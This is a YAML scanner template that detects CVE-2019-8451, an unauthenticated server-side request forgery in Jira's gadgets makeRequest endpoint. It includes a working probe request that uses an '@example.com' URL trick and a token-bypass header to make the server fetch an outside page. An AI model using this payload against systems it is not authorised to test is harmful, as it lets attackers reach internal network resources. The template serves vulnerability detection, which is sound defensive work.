id: CVE-2019-8451

info:
    name: Jira SSRF
    author: zan8in
    severity: medium
    description: "Jira的/plugins/servlet/gadgets/makeRequest资源存在SSRF漏洞，原因在于JiraWhitelist这个类的逻辑缺陷，成功利用此漏洞的远程攻击者可以以Jira服务端的身份访问内网资源。经分析，此漏洞无需任何凭据即可触发。"
    reference:
        - https://github.com/jas502n/CVE-2019-8451
        - https://www.cnblogs.com/backlion/p/11608371.html

transport: http
set:
    originScheme: request.url.scheme
    originHost: request.url.host
rules:
    r0:
        request:
            method: GET
            path: /plugins/servlet/gadgets/makeRequest?url={{originScheme}}://{{originHost}}@example.com/
            headers:
                X-Atlassian-Token: no-check
        expression: response.status == 200 && response.body.bcontains(b'Example Domain')
expression: r0()

